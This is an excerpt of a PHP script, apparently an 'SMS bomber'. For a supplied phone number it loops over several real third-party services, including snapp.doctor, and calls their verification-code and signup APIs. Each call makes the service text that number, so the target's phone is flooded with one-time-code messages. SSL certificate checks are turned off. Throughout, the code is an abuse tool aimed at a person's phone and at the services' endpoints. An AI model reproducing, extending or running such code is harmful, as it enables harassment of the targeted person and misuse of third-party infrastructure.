    ...
    if ($Phone_Count == "10") {
        ...
        if ($count_Count == "1" || $count_Count == "2" && $count <= "20") {
            ...
            while ($i < $count_final) {
                ...
                //Sms Sender Curl 7
                $Sender = curl_init();
                $Sender_Url = "https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/$full_phone/sms?cCode=+46";
                curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
                curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
                curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
                curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
                ...
                curl_setopt($Sender, CURLOPT_POST, true);
                curl_setopt($Sender, CURLOPT_POSTFIELDS, '{"way":"mobile","identity":"+46-' . $Phone . '"}');
                curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
                $Sender_Response = curl_exec($Sender);
                curl_close($Sender);
                //----------------------------------------------------------------------------//
                ...
                curl_setopt($Sender, CURLOPT_POST, true);
                curl_setopt($Sender, CURLOPT_POSTFIELDS, '{"lang":"fa","country_id":"1","password":"' . $password . '","mobile_phone":"' . $full_phone . '","country_code":"+46","email":"' . $email . '"}');
                curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
                $Sender_Response = curl_exec($Sender);
                curl_close($Sender);
                //----------------------------------------------------------------------------//
                ...
                curl_setopt($Sender, CURLOPT_POST, true);
                curl_setopt($Sender, CURLOPT_POSTFIELDS, '{"cellphone":"+46-' . $Phone . '"}');
                curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
                $Sender_Response = curl_exec($Sender);
                curl_close($Sender);
                //----------------------------------------------------------------------------//
...
'Accept-Encoding: gzip, deflate'"));
                ...
                curl_setopt($Sender, CURLOPT_POST, true);
                curl_setopt($Sender, CURLOPT_POSTFIELDS, '{"api_version":"3","method":"sendCode","data":{"phone_number":"46' . $Phone . '","send_type":"SMS"}}');
                curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
                $Sender_Response = curl_exec($Sender);
                curl_close($Sender);
                //============================================================================//
